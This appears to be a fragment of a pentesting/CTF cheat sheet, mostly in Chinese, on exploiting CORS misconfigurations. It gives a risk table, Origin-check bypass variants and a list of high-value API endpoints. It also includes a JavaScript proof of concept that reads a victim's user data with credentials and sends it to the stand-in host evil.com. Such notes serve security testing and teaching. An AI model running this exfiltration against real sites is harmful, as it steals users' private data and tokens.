...
- Session or JSON action abuse: [csrf cross site request forgery](./csrf.md)
- OAuth token leakage and callback binding: [oauth oidc misconfiguration](./oauth-token-attacks.md)
- API auth context: [api auth and jwt abuse](./api-auth-and-jwt-abuse.md)
...
# 补充：CORS 方法论速查（中文，融合自 wgpsec/AboutSecurity）
...
| `null` | true | **高** — iframe sandbox 可设 null origin |
| `*` | false | **低** — 不能带 Cookie，通常只暴露公开数据 |
| 固定白名单 | true | 安全（除非白名单里有你控制的域名）|

Origin 校验绕过变体：`Origin: null`、`https://evil.target.com`、`https://target.com.evil.com`（子域）、`https://attackertarget.com` / `https://target.com.attacker.com`（前后缀匹配）、HTTPS 站点接受 `http://target.com`（协议降级）。
...
fetch('http://target/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('http://evil.com/log?data=' + JSON.stringify(data)));
</script>
```

高价值数据：`/api/profile`、`/api/userinfo`、API 密钥/Token、内部 API、管理面板数据。

## 注意事项

- CORS 漏洞需受害者访问攻击者页面才触发（同 CSRF/XSS）
- 纯 `ACAO: *` 不允许 `credentials: include`，风险较低
- 检查 preflight（OPTIONS）处理 —— 有些框架只在 GET 上设 CORS，不在 OPTIONS 上
- CTF 中 Flag 通常在需要管理员 Cookie 的 API 里
